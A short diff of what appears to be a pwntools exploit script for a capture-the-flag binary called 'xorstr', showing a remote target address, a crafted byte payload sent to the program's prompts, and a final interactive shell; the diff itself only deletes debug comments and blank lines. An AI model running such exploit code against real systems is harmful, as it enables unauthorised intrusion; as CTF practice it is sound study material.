@@ -7,8 +7,6 @@ from pwn import *
 e = ELF('xorstr')
 l = ELF('libc.so.6')
 context.arch = 'amd64'
-#y = process( './secretgarden' , env = {'LD_PRELOAD':'./libc_64.so.6'} )
-#print util.proc.pidof(y)
 
 host , port = '10.13.2.43' , 30739
 #host , port = '192.168.78.141' , 4000
@@ -53,9 +51,6 @@ y.sendafter( 'string:' , '\xb2\x43' * 1 + 'B' * 0x6 + p + '\xc1' * ( 128 - len(p
 sleep(0.2)
 y.sendafter( 'xor :' , 'B' * 128  )
 sleep(0.2)
-
-
-
 
 
 y.interactive()
